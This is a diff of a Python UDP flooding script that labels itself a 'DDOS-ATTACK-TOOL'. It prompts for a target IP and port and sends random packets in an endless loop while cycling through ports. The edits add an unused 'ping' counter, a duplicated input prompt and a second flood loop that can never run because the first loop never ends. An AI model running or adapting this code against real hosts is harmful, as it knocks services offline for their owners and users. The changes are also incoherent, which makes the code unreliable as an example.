@@ -40,6 +40,7 @@ K_bytes = random._urandom(5099)
 ip = input("IP Target : ")
 port = eval(input("Target Port       : "))
 sent = eval(input("Packet Pizza Hot       : "))
+ping = eval(input("Packet Pizza Hot       : "))
 # Lets start the attack
 print("Terimakasih Yang Telah Menggunakan Tools Ini (DDOS-ATTACK-TOOL).")
 print("Memulai Mengirim Packet Trojan ", ip, " Dan Ke port ", port, "...")
@@ -50,9 +51,24 @@ while True:
     sock.sendto(K_bytes, (ip, port))
     sent = sent + 1
     port = port + 1
+    ping = ping + 1
     print("Sent %s packet to %s throught port:%s" % (sent, ip, port))
     if port == 65534:
-        port = 1
+       port = 1
+    if ping == 65534:
+       ping = 1
+
+while True:
+    sock.sendto(K_bytes, (ip, port))
+    sent = sent + 1
+    port = port + 1
+    ping = ping + 1
+    print("Sent %s packet to %s throught port:%s" % (sent, ip, port))
+    if port == 65534:
+       port = 1
+    if ping == 65534:
+       ping = 1
+
 # End of the script
 os.system("cls")
 input("Press Enter to exit...")
